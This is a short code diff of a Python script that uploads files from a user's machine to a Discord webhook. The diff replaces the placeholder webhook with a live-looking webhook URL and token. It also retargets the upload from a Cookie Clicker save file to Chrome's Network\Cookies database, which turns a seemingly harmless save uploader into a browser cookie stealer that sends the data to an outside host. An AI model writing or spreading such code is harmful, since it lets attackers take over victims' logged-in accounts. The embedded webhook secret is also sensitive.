@@ -5,12 +5,12 @@ import requests
 import getpass
 
 # 1. Set your Discord webhook URL here
-WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_DISCORD_WEBHOOK_URL_HERE"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1429860870686511266/1CaCq46qxmyLYYn2rW98ThL016IEBQPMO4avu6lm6sEezpq2lywY8_LN4PeW4dFOS3El"
 
 # 2. Set the paths to the files you want to upload (you can add more!)
 # Use '____' in place of the username — it will be replaced automatically
 FILE_PATHS = [
-    r"C:\Users\____\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb\cookie_clicker_save.txt",
+    r"C:\Users\____\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
     # Add more paths here if needed
 ]
 
